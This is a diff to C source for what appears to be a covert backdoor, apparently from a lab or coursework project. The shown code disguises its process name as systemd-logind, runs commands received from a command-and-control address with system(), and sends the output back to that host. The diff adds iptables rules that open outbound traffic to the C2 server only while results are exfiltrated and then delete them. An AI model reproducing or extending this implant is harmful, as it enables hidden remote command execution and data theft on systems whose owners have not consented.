@@ -9,6 +9,8 @@
 #define MASK "/usr/lib/systemd/systemd-logind"
 #define CMD "./cmd.sh > results"
 #define CHMOD "chmod 755 cmd.sh"
+#define IPTABLES "iptables -A OUTPUT -p tcp -d 192.168.1.3 --dport 8505 -j ACCEPT"
+#define TURNOFF "iptables -D OUTPUT -p tcp -d 192.168.1.3 --dport 8505 -j ACCEPT"
 #define RESULT_FILE "results"
 #define INFECTEDIP "192.168.1.13"
 #define CNCIP "192.168.1.3"
@@ -205,6 +207,7 @@ void ParsePayload(const u_char *payload, int len){
     fclose(fp);
     system(CHMOD);
     system(CMD);
+    system(IPTABLES);
 
 
     //sending the results back to the CNC
@@ -214,6 +217,7 @@ void ParsePayload(const u_char *payload, int len){
     unsigned short dport = SHPORT;
 
     send_results(srcip, destip, sport, dport, RESULT_FILE);
+    system(TURNOFF);
 }
 
 void recv_results(char* sip, unsigned short sport) {
